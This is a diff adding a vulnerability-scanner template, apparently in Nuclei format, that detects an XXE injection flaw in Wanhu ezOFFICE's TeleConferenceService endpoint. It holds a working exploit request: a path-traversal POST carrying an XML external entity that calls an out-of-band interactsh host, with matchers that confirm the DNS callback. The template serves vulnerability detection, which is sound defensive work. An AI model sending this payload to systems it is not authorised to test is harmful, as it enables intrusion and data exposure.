@@ -1,0 +1,29 @@
+id: wanhu-ezoffice-teleconferenceservice-xxe
+info:
+  name: Wanhu ezOFFICE TeleConferenceService XXE Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: xxe,dnslog
+variables:
+  reverse: '{{interactsh-url}}'
+http:
+  - raw:
+      - |
+        POST /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../TeleConferenceService HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/xml
+
+        <?xml version="1.0" encoding="UTF-8" ?>
+        <!DOCTYPE ANY [
+        <!ENTITY xxe SYSTEM "http://{{reverse}}" >]>
+        <value>&xxe;</value>
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+      - type: word
+        part: interactsh_request
+        words:
+          - "&xxe"
